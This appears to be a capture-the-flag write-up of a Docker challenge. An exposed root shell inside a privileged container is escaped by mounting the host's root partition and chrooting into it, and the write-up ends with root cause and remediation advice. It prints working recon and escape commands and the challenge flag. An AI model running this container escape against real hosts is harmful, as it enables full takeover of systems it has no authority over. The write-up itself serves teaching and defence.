# Docker 2 — Privileged Container Escape

**Category:** Docker Security
**Difficulty:** Medium
**Points:** 200
**Objective:** Escape the container environment to control the host.

## Summary

The target exposed a raw TCP shell on a non-standard port that dropped
straight into a **privileged Docker container** running as root. Because the
container was started with `--privileged`, it retained full Linux
capabilities and direct access to the host's block devices. This allowed
mounting the host's root filesystem from inside the container and `chroot`ing
into it, achieving full host compromise.

## Recon

Nmap scan of the target revealed two open ports:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u7
1337/tcp open  waste?
```

- Port 22 (SSH) rejected password auth — not the intended path.
- Port 1337 returned no banner and didn't speak HTTP or TLS.

## Foothold

Connecting to port 1337 with `nc` and sending input revealed it was a
**blind bash shell** — commands were executed but no prompt or echo was
returned. Sending `id` confirmed we already had root inside the container:

```
$ nc 172.31.15.8 1337
id
uid=0(root) gid=0(root) groups=0(root)
```

## Enumeration

Standard container-escape checklist:

| Check | Result |
|---|---|
| `/.dockerenv` present | Yes — confirmed we're in a container |
| `hostname` | `ed5f574705e6` (container ID, not a real hostname) |
| `cat /proc/self/status \| grep Cap` | `CapEff: 000001ffffffffff` — **all capabilities granted** |
| `/dev` contents | Raw host block devices visible: `nvme0n1`, `nvme0n1p1`, `nvme0n1p14`, `nvme0n1p15` |
| `mount` / `/proc/mounts` | Root filesystem is an `overlay2` Docker layer; `/etc/resolv.conf`, `/etc/hostname`, `/etc/hosts` bind-mounted from `/dev/nvme0n1p1` |

A `CapEff` value of `000001ffffffffff` corresponds to every capability bit
set — the strongest signal that the container is running with the
`--privileged` flag. Combined with unrestricted visibility of host disk
devices in `/dev`, this is a direct path to host compromise: a privileged
container has no meaningful kernel-level isolation from the host.

## Exploitation

Since the container can see and mount the host's raw disk devices, we mount
the host's root partition directly and `chroot` into it:

```bash
mkdir -p /mnt/host
mount /dev/nvme0n1p1 /mnt/host
ls -la /mnt/host        # full host filesystem: /etc, /root, /home, /var, ...
chroot /mnt/host /bin/bash
```

Verification that we're now operating on the **host**, not the container:

```bash
cat /etc/hostname
# debian
```

(vs. the container's hostname `ed5f574705e6` seen earlier)

## Loot

```bash
cat /root/flag.txt
```

```
ctf{aiwaij7sac3thaeve6dij8oy5aeToofe}
```

## Attack Chain Summary

1. **Recon** — nmap identifies an unauthenticated raw TCP service on port 1337.
2. **Foothold** — the service is a blind bash shell, already running as
   `root` *inside* a Docker container.
3. **Privilege discovery** — `CapEff` shows all capabilities enabled and
   `/dev` exposes raw host block devices, indicating the container was
   launched with `--privileged`.
4. **Escape** — mount the host's root partition (`/dev/nvme0n1p1`) inside the
   container and `chroot` into it, gaining a shell in the host's filesystem
   namespace as root.
5. **Impact** — full read/write access to the host filesystem; flag
   retrieved from `/root/flag.txt` on the host.

## Root Cause

The container was launched with the `--privileged` flag, which:

- Grants **all Linux capabilities** (`CAP_SYS_ADMIN`, `CAP_MKNOD`,
  `CAP_SYS_MODULE`, etc.) instead of Docker's normal restricted default set.
- Disables the seccomp, AppArmor, and device-cgroup restrictions Docker
  applies by default.
- Exposes the host's `/dev` devices (including raw block devices) inside the
  container.

With all of that combined, the "container boundary" is effectively
cosmetic — any process with root inside the container can mount host disks,
access host devices, and pivot out.

## Remediation

- **Never use `--privileged`** in production or exposed environments.
- Grant only the specific capabilities a workload needs via `--cap-add`
  (and drop everything else with `--cap-drop=ALL` as a baseline).
- If device access is required, use scoped `--device` mappings instead of
  full privileged mode.
- Enable and keep the default seccomp/AppArmor profiles active.
- Avoid exposing raw host block devices to containers; use volume mounts
  scoped to specific directories instead of whole disks.

## Tools Used

- `nmap` — port/service discovery
- `nc` / raw Python sockets — interacting with the blind shell on port 1337
- Standard Linux enumeration (`id`, `cat /proc/self/status`, `mount`,
  `/proc/mounts`, `/dev` listing) — container/privilege recon
- `mount` + `chroot` — the actual escape primitive
